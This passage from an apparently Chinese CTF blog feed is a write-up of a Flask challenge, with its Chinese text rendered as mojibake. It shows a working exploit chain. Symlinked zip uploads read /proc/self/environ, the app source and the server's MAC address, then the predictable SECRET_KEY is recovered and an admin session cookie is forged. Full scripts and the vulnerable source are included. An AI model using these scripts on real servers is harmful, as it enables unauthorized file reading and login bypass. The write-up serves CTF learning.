sessionï¼Œæ¥ä¸‹æ¥çš„æ€è·¯æ˜¯ä¸€æ ·çš„ï¼Œå°±æ˜¯æƒ³åŠæ³•å…ˆæ‹¿åˆ°æºç ã€‚</p><p><img src="https://i.loli.net/2021/03/02/akT8L3im6Sbphr2.jpg" alt="awp_falsk1.jpg"></p><h2 id="ç¬¬äºŒæ­¥"><a href="#ç¬¬äºŒæ­¥" class="headerlink" title="ç¬¬äºŒæ­¥"></a><strong>ç¬¬äºŒæ­¥</strong></h2><p>æµ‹è¯•ä¸Šä¼ ç‚¹ï¼Œå‘ç°åªèƒ½ä¸Šä¼ zipæ–‡ä»¶ï¼Œå¹¶è¿”å›zipè§£å‹åçš„æ–‡ä»¶å†…å®¹ã€‚å°è¯•å‹ç¼©è½¯é“¾æ¥ä¸Šä¼ ï¼Œå‘ç°ä¼šå›æ˜¾å¯¹åº”çš„æ–‡ä»¶å†…å®¹ï¼Œè¿™æ ·å°±å®ç°äº†ä¸€ä¸ªä»»æ„æ–‡ä»¶ä¸‹è½½ï¼Œé€šè¿‡è¿™ä¸ªå¯ä»¥å¼€å§‹æƒ³åŠæ³•æ‰¾åˆ°æºç çš„è·¯å¾„ï¼Œæˆ‘ä»¬è¦ç”¨åˆ°ä¸Šä¼ zipfileè¯»å–åˆ°<code>SECRET_KEY</code>ï¼Œç„¶åä¼ªé€ adminçš„sessionè¿›è¡Œç™»å½•ã€‚</p><p><img src="https://i.loli.net/2021/03/02/QkSH5WdNi8yUCqE.jpg" alt="awp_falsk2.jpg"></p><h2 id="ç¬¬ä¸‰æ­¥"><a href="#ç¬¬ä¸‰æ­¥" class="headerlink" title="ç¬¬ä¸‰æ­¥"></a>ç¬¬ä¸‰æ­¥</h2><p>æ¥ä¸‹æ¥ä¸»è¦ç›®æ ‡æ˜¯è·å–æºç </p><p>è„šæœ¬å¦‚ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://xxxx/upload&#x27;</span></span><br><span class="line">def makezip():</span><br><span class="line">    os.system(<span class="string">&#x27;ln -s &#x27;</span>+sys.argv[1]+<span class="string">&#x27; exp&#x27;</span>)</span><br><span class="line">    os.system(<span class="string">&#x27;zip --symlinks exp.zip exp&#x27;</span>)</span><br><span class="line">makezip()</span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">&#x27;the_file&#x27;</span>:open(<span class="string">&#x27;./exp.zip&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)&#125;</span><br><span class="line">def exploit():</span><br><span class="line">    res = requests.post(url,files=files)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line">exploit()</span><br><span class="line">os.system(<span class="string">&#x27;rm -rf exp&#x27;</span>)</span><br><span class="line">os.system(<span class="string">&#x27;rm -rf exp.zip&#x27;</span>)</span><br></pre></td></tr></table></figure><p>å¦‚æœå¯¹linuxæ¯”è¾ƒäº†è§£åº”è¯¥ä¼šçŸ¥é“ <code>/proc</code>ç›®å½• ï¼Œç„¶åé€šè¿‡ <code>/proc/self/environ</code>çš„è½¯é“¾æ¥ æ¥è·å¾—flaskçš„ç¯å¢ƒå˜é‡ï¼Œç¯å¢ƒå˜é‡ä¸­å¯ä»¥æ‰¾åˆ°é…ç½®æ–‡ä»¶è·¯å¾„å’Œä¸€äº›ä¿¡æ¯</p><p><img src="https://i.loli.net/2021/03/02/h5J8X9jNV6Hq4p1.jpg" alt="awp_falsk3.jpg"></p><p>æ•´ç†ä¸€ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">UWSGI_ORIGINAL_PROC_NAME=/usr/<span class="built_in">local</span>/bin/uwsgi</span><br><span class="line">SUPERVISOR_GROUP_NAME=uwsgi</span><br><span class="line">HOSTNAME=5a000ec609dc</span><br><span class="line">PYTHON_PIP_VERSION=20.1</span><br><span class="line">HOME=/root</span><br><span class="line">GPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D</span><br><span class="line">UWSGI_INI=/app/y0u_found_it.ini</span><br><span class="line">NGINX_MAX_UPLOAD=0</span><br><span class="line">UWSGI_PROCESSES=16</span><br><span class="line">STATIC_URL=/static</span><br><span class="line">PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/1fe530e9e3d800be94e04f6428460fc4fb94f5a9/get-pip.py</span><br><span class="line">UWSGI_CHEAPER=2</span><br><span class="line">PATH=/usr/<span class="built_in">local</span>/bin:/usr/<span class="built_in">local</span>/sbin:/usr/<span class="built_in">local</span>/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">LANG=C.UTF-8</span><br><span class="line">SUPERVISOR_ENABLED=1</span><br><span class="line">PYTHON_VERSION=3.6.10</span><br><span class="line">NGINX_WORKER_PROCESSES=auto</span><br><span class="line">SUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sock</span><br><span class="line">SUPERVISOR_PROCESS_NAME=uwsgi</span><br><span class="line">LISTEN_PORT=80</span><br><span class="line">STATIC_INDEX=0</span><br><span class="line">PWD=/app/y0u_found_it</span><br><span class="line">PYTHON_GET_PIP_SHA256=ce486cddac44e99496a702aa5c06c5028414ef48fdfd5242cd2fe559b13d4348</span><br><span class="line">STATIC_PATH=/app/static</span><br><span class="line">PYTHONPATH=/app</span><br><span class="line">UWSGI_RELOADS=0</span><br></pre></td></tr></table></figure><h2 id="ç¬¬å››æ­¥"><a href="#ç¬¬å››æ­¥" class="headerlink" title="ç¬¬å››æ­¥"></a>ç¬¬å››æ­¥</h2><p>æ‰«ä¸€çœ¼è¿‡å»ï¼Œèƒ½å¤Ÿå‘ç°ä¸€é¡¹<code>UWSGI_INI</code>ï¼Œä»¥INIç»“å°¾ï¼Œåº”è¯¥æ˜¯ä¸ªé…ç½®æ–‡ä»¶ ï¼Œè€Œä¸”ä»å‘½åæ¥çœ‹</p><p>â€y0u_found_it.iniâ€œå·²ç»åœ¨æç¤ºè¿™ä¸ªiniæ–‡ä»¶æœ‰é—®é¢˜ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥ æ„é€ è½¯é“¾æ¥ï¼Œç”Ÿæˆzipï¼Œä¸Šä¼ è¯»å–ã€‚<br>å¾—åˆ°<code>/app/ y0u_found_it.ini</code>å†…å®¹</p><p><img src="https://i.loli.net/2021/03/02/v7ilWwXUahBEFoL.jpg" alt="awp_falsk4.jpg"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[uwsgi]</span><br><span class="line">module = y0u_found_it.y0u_found_it_main</span><br><span class="line">callable=app</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±æ‰¾åˆ°äº†æºä»£ç è·¯å¾„<code>/app/y0u_found_it/y0u_found_it_main.py</code></p><p>æ¥ä¸‹æ¥è·å–æºç å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,session,render_template,redirect, url_for, escape, request,Response</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> secret</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">100</span>)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">&#x27;./uploads&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = <span class="number">100</span> * <span class="number">1024</span></span><br><span class="line">ALLOWED_EXTENSIONS = <span class="built_in">set</span>([<span class="string">&#x27;zip&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span>(<span class="params">filename</span>):</span></span><br><span class="line"> Â  Â <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line"> Â  Â  Â  Â  Â  filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line"> Â  Â error = request.args.get(<span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"> Â  Â </span><br><span class="line"></span><br><span class="line"> Â  Â <span class="keyword">if</span>(error == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line"> Â  Â  Â  Â session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line"> Â  Â  Â  Â <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, forbidden=<span class="number">1</span>)</span><br><span class="line"> Â  Â <span class="keyword">if</span> <span class="keyword">not</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line"> Â  Â  Â  Â session[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&quot;guest&quot;</span></span><br><span class="line"> Â  Â </span><br><span class="line"> Â  Â <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line"> Â  Â  Â  Â <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, user=session[<span class="string">&#x27;username&#x27;</span>], secret=secret.secret)</span><br><span class="line"> Â  Â <span class="keyword">else</span>:</span><br><span class="line"> Â  Â  Â  Â </span><br><span class="line"> Â  Â  Â  Â <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span>():</span></span><br><span class="line"> Â  Â <span class="keyword">if</span> <span class="string">&#x27;the_file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line"> Â  Â  Â  Â <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"> Â  Â file = request.files[<span class="string">&#x27;the_file&#x27;</span>]</span><br><span class="line"> Â  Â <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line"> Â  Â  Â  Â <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"> Â  Â <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line"> Â  Â  Â  Â filename = secure_filename(file.filename)</span><br><span class="line"> Â  Â  Â  Â file_save_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)</span><br><span class="line"> Â  Â  Â  Â <span class="keyword">if</span>(os.path.exists(file_save_path)):</span><br><span class="line"> Â  Â  Â  Â  Â  Â <span class="keyword">return</span> <span class="string">&#x27;This file already exists&#x27;</span></span><br><span class="line"> Â  Â  Â  Â file.save(file_save_path)</span><br><span class="line"> Â  Â <span class="keyword">else</span>:</span><br><span class="line"> Â  Â  Â  Â <span class="keyword">return</span> <span class="string">&#x27;This file is not a zipfile&#x27;</span></span><br><span class="line"></span><br><span class="line"> Â  Â <span class="keyword">try</span>:</span><br><span class="line"> Â  Â  Â  Â extract_path = file_save_path + <span class="string">&#x27;_&#x27;</span></span><br><span class="line"> Â  Â  Â  Â os.system(<span class="string">&#x27;unzip -n &#x27;</span> + file_save_path + <span class="string">&#x27; -d &#x27;</span>+ extract_path)</span><br><span class="line"> Â  Â  Â  Â read_obj = os.popen(<span class="string">&#x27;cat &#x27;</span> + extract_path + <span class="string">&#x27;/*&#x27;</span>)</span><br><span class="line"> Â  Â  Â  Â file = read_obj.read()</span><br><span class="line"> Â  Â  Â  Â read_obj.close()</span><br><span class="line"> Â  Â  Â  Â os.system(<span class="string">&#x27;rm -rf &#x27;</span> + extract_path)</span><br><span class="line"> Â  Â <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"> Â  Â  Â  Â file = <span class="literal">None</span></span><br><span class="line"> Â  Â </span><br><span class="line"> Â  Â os.remove(file_save_path)</span><br><span class="line"> Â  Â <span class="keyword">if</span>(file != <span class="literal">None</span>):</span><br><span class="line"> Â  Â  Â  Â <span class="keyword">if</span>(file.find(base64.b64decode(<span class="string">&#x27;ZmxhZw==&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)) != -<span class="number">1</span>):</span><br><span class="line"> Â  Â  Â  Â  Â  Â <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>, error=<span class="number">1</span>))</span><br><span class="line"> Â  Â <span class="keyword">return</span> Response(file)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"> Â  Â <span class="comment">#app.run(debug=True)</span></span><br><span class="line"> Â  Â app.run(host=<span class="string">&#x27;127.0.0.1&#x27;</span>, debug=<span class="literal">False</span>, port=<span class="number">10008</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ç¬¬äº”æ­¥"><a href="#ç¬¬äº”æ­¥" class="headerlink" title="ç¬¬äº”æ­¥"></a><strong>ç¬¬äº”æ­¥</strong></h2><p>æŸ¥çœ‹ä»£ç å‘ç°secret=secret.secretï¼Œå¯ä»¥çŸ¥é“flagåº”è¯¥æ˜¯åœ¨<code>secret.py</code>æ–‡ä»¶é‡Œï¼Œå¦‚æœè½¯é“¾æ¥ç›´æ¥è¯»å– ï¼Œå‘ç°è¿˜æ˜¯æç¤º<code>you are not admin</code> ï¼Œæ‰€ä»¥è¿˜æ˜¯å¾—æŒ‰ç…§å‰é¢çš„åˆ†æ é€šè¿‡æ‰¾<code>SECRET_KEY</code> æ¥è§£å†³ï¼Œå› ä¸º python randomç”Ÿæˆçš„æ•°ä¸æ˜¯çœŸæ­£çš„éšæœºæ•°ï¼Œè€Œæ˜¯ä¼ªéšæœºæ•°ï¼Œåˆ©ç”¨ä¼ªéšæœºæ•°çš„ç‰¹æ€§ï¼Œåªè¦ç§å­æ˜¯ä¸€æ ·çš„ï¼Œåé¢äº§ç”Ÿçš„éšæœºæ•°å€¼ä¹Ÿæ˜¯ä¸€è‡´çš„ã€‚</p><p>æŸ¥çœ‹ä»£ç å¯çŸ¥é€šè¿‡<code>uuid.getnode()</code>å‡½æ•° è·å–ç½‘å¡macåœ°å€å¹¶è½¬æ¢æˆåè¿›åˆ¶æ•°è¿”å› ï¼Œé‚£ä¹ˆæ€è·¯å°±å˜æˆäº†å…ˆè·å–æœåŠ¡å™¨çš„ç½‘å¡macåœ°å€æ¥ç¡®å®šç§å­ï¼Œè¿›è€Œç¡®å®š<code>SECRET_KEY</code>ï¼Œä»è€Œä¼ªé€ <code>session</code></p><p>å› ä¸ºlinuxä¸­ä¸€åˆ‡éƒ½æ˜¯æ–‡ä»¶ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡è¯»<code>/sys/class/net/eth0/address</code>æ–‡ä»¶å¾—åˆ°macåœ°å€</p><p>ç„¶å æŠŠmacåœ°å€å¤„ç†ä¸‹ï¼Œè½¬æ¢æˆ10è¿›åˆ¶ï¼Œç„¶åè®¾ç½®æˆseedï¼Œç”Ÿæˆ <code>SECRET_KEY</code>ï¼Œä¸‹é¢æ˜¯è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">mac = <span class="string">&quot;mac&quot;</span></span><br><span class="line">sss = mac.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">sss = [<span class="built_in">int</span>(i,<span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> sss]</span><br><span class="line">sss = [<span class="built_in">bin</span>(i).replace(<span class="string">&#x27;0b&#x27;</span>,<span class="string">&#x27;&#x27;</span>).zfill(<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> sss]</span><br><span class="line">sss = <span class="string">&#x27;&#x27;</span>.join(sss)</span><br><span class="line">mac = <span class="built_in">int</span>(sss,<span class="number">2</span>)</span><br><span class="line">random.seed(mac)</span><br><span class="line">randStr = <span class="built_in">str</span>(random.random()*<span class="number">100</span>)</span><br><span class="line">print(randStr)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¦å¤–ä¸€ä¸ªå¸ˆå‚…ç»™å‡ºäº†å¦å¤–ä¸€ä¸ªç®€ä»‹ç‰ˆæœ¬ï¼Œå½“æ—¶å†™çš„æ—¶å€™å°±è§‰å¾—ä¸Šé¢é‚£ä¸ªæœ‰ç‚¹å¤æ‚äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">mac = <span class="string">&quot;mac&quot;</span></span><br><span class="line">sss = mac.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">sss = <span class="string">&#x27;&#x27;</span>.join(sss)</span><br><span class="line">mac = <span class="built_in">eval</span>(<span class="string">&quot;0x&quot;</span>+sss)</span><br><span class="line">print(mac)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ç¬¬å…­æ­¥"><a href="#ç¬¬å…­æ­¥" class="headerlink" title="ç¬¬å…­æ­¥"></a><strong>ç¬¬å…­æ­¥</strong></h2><p>æ¥ä¸‹æ¥å°±æ˜¯é€šè¿‡keyè·å–adminçš„sessionï¼Œè¿™é‡Œæ˜¯é€šè¿‡flask-session-cookie-managerè„šæœ¬è·å–</p><p><img src="https://i.loli.net/2021/03/02/P4zwVnSjak2ClQ5.jpg" alt="awp_falsk5.jpg"></p><p>sessionæˆåŠŸä¼ªé€ ï¼Œè·å¾—flag</p><p><img src="https://i.loli.net/2021/03/02/sz2d16LKrAVwOXZ.jpg" alt="awp_falsk6.jpg"></p><p>expè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_file</span>(<span class="params">file_name</span>):</span></span><br><span class="line">  link(file_name)</span><br><span class="line">  files = &#123;<span class="string">&#x27;the_file&#x27;</span>: <span class="built_in">open</span>(file_name[-<span class="number">5</span>:] + <span class="string">&#x27;.zip&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)&#125;</span><br><span class="line">  r2 = s.post(url+<span class="string">&#x27;upload&#x27;</span>, files=files)</span><br><span class="line">  <span class="keyword">return</span> r2.text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">link</span>(<span class="params">file_name</span>):</span></span><br><span class="line">  os.system(<span class="string">&#x27;ln -s &#123;file_name&#125; &#123;output&#125;&#x27;</span>.<span class="built_in">format</span>(file_name = file_name, output = file_name[-<span class="number">5</span>:]))</span><br><span class="line">  os.system(<span class="string">&#x27;zip -y -m &#123;output&#125;.zip &#123;output&#125;&#x27;</span>.<span class="built_in">format</span>(file_name = file_name, output = file_name[-<span class="number">5</span>:]))</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://xxxxxx/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> requests.Session() <span class="keyword">as</span> s:</span><br><span class="line">  en = read_file(<span class="string">&#x27;/proc/self/environ&#x27;</span>)</span><br><span class="line">  ini = re.search(<span class="string">&#x27;UWSGI_INI=(.*?)\x00&#x27;</span>, en).group(<span class="number">1</span>)</span><br><span class="line">  pwd = re.search(<span class="string">&#x27;PWD=(.*?)\x00&#x27;</span>, en).group(<span class="number">1</span>)</span><br><span class="line">  ini = read_file(ini)</span><br><span class="line">  source = re.search(<span class="string">&#x27;module = .*?\.(.*?)\n&#x27;</span>, ini).group(<span class="number">1</span>)</span><br><span class="line">  source = pwd+<span class="string">&#x27;/&#x27;</span>+source+<span class="string">&#x27;.py&#x27;</span></span><br><span class="line">  source = read_file(source)</span><br><span class="line">  <span class="keyword">if</span>(source.find(<span class="string">&#x27;import&#x27;</span>) == -<span class="number">1</span>):</span><br><span class="line">â€‹    exit(<span class="string">&#x27;fail&#x27;</span>)</span><br><span class="line">  mac = <span class="string">&#x27;/sys/class/net/eth0/address&#x27;</span></span><br><span class="line">  mac = read_file(mac)</span><br><span class="line">  mac = mac[:-<span class="number">1</span>]</span><br><span class="line">  mac = <span class="string">&#x27;&#x27;</span>.join(mac.split(<span class="string">&#x27;:&#x27;</span>))</span><br><span class="line">  mac = <span class="built_in">int</span>(mac, <span class="number">16</span>)</span><br><span class="line">  random.seed(mac)</span><br><span class="line">  key = random.random()*<span class="number">100</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(key)</span><br><span class="line">payload = &#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>&#125;</span><br><span class="line">serializer = SecureCookieSessionInterface().get_signing_serializer(app)</span><br><span class="line">session = serializer.dumps(payload)</span><br><span class="line">cookies = &#123;<span class="string">&#x27;session&#x27;</span>: session&#125;</span><br><span class="line">r = requests.get(url, cookies=cookies)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ä¸€é“flaskçš„wp&quot;&gt;&lt;a href=&quot;#ä¸€é“flaskçš„wp&quot; class=&quot;headerlink&quot; title=&quot;ä¸€é“flaskçš„wp&quot;&gt;&lt;/a&gt;ä¸€é“flaskçš„wp&lt;/h1&gt;&lt;p&gt;æœ¬é¢˜ä¸ºæ ¡å†…ä¸€ä¸ªå¸ˆå…„å‡ºçš„é¢˜ï¼Œåœ¨æœ¬åœ°æ­å¥½äº†ç¯å¢ƒè¿›è¡Œè¯•éªŒã€‚&lt;/p&gt;
&lt;h2 id=</summary>
      
    
    
    
    <category term="ctf" scheme="http://www.fxizenta.design/categories/ctf/"/>
    
    <category term="web" scheme="http://www.fxizenta.design/categories/ctf/web/"/>
    
    
    <category term="flask" scheme="http://www.fxizenta.design/tags/flask/"/>
    
  </entry>
  
  <entry>
    <title>Hello</title>
    <link href="http://www.fxizenta.design/2021/01/24/hello-world/"/>
    <id>http://www.fxizenta.design/2021/01/24/hello-world/</id>
    <published>2021-01-23T16:00:00.000Z</published>
    <updated>2021-03-15T10:58:21.520Z</updated>
    
    <content type="html"><![CDATA[<p>æœ¬åšå®¢åˆ›å»ºäº2021å¹´1æœˆ24æ—¥ï¼Œå› åœ¨ç«èµ›å­¦ä¹ ä¸­æ„Ÿè§‰åˆ°å­¦åˆ°çš„çŸ¥è¯†é—å¿˜çš„è¿‡å¿«ï¼Œäºæ˜¯å†³å®šå»ºç«‹æ­¤åšå®¢ï¼Œç”¨äºåˆ†äº«ä»¥åŠè®°å½•å­¦ä¹ ç¬”è®°ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;æœ¬åšå®¢åˆ›å»ºäº2021å¹´1æœˆ24æ—¥ï¼Œå› åœ¨ç«èµ›å­¦ä¹ ä¸­æ„Ÿè§‰åˆ°å­¦åˆ°çš„çŸ¥è¯†é—å¿˜çš„è¿‡å¿«ï¼Œäºæ˜¯å†³å®šå»ºç«‹æ­¤åšå®¢ï¼Œç”¨äºåˆ†äº«ä»¥åŠè®°å½•å­¦ä¹ ç¬”è®°ã€‚&lt;/p&gt;
</summary>
      
    
    
    
    
  </entry>
  
</feed>
